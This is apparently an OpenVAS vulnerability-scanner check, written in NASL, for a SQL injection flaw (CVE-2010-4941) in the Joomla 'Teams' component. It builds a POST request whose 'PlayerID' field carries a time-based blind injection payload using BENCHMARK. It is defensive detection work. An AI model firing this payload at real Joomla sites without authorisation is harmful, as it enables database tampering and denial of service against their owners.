##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_teams_sql_inj_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Joomla 'Teams' Component SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application.";
tag_affected = "Joomla Team Component version 1_1028_100809_1711";
tag_insight = "Input passed via the 'PlayerID' parameter to 'index.php' is not properly
  sanitised before being used in SQL queries.";
tag_solution = "No solution or patch is available as of 08th November, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://joomla-clantools.de/downloads/cat_view/34-komponenten.html";
tag_summary = "This host is running Joomla with Teams component and is prone to
  SQL injection vulnerability.";

if(description)
{
  script_id(802189);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2010-4941");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-11-09 13:02:45 +0530 (Wed, 09 Nov 2011)");
  script_name("Joomla 'Teams' Component SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/40933");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14598/");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/archive/1/512974/100/0/threaded");

  script_description(desc);
  script_summary("Check if Joomla Teams component is vulnerable for SQL Injection attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");

## Get HTTP port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:joomlaPort)){
  exit(0);
}

## Get the dir from KB
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

## Try an exploit
filename = string(joomlaDir + "/index.php");
host = get_host_name();
postData = "FirstName=OpenVAS-SQL-Test&LastName=SecPod&Notes=sds&TeamNames" +
           "[1]=on&UniformNumber[1]=1&Active=Y&cid[]=&PlayerID=-1 OR (SELECT" +
           "(IF(0x41=0x41,BENCHMARK(99999999,NULL),NULL)))&option=com_teams&" +
           "task=save&controller=player";

## Construct post request
sndReq = string("POST ", filename, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: ", strlen(postData), "\r\n\r\n",
                postData);
rcvRes = http_keepalive_send_recv(port:joomlaPort, data:sndReq);

## Confirm the exploit
if("OpenVAS-SQL-Test" >< rcvRes && "SecPod" >< rcvRes){
  security_hole(joomlaPort);
}
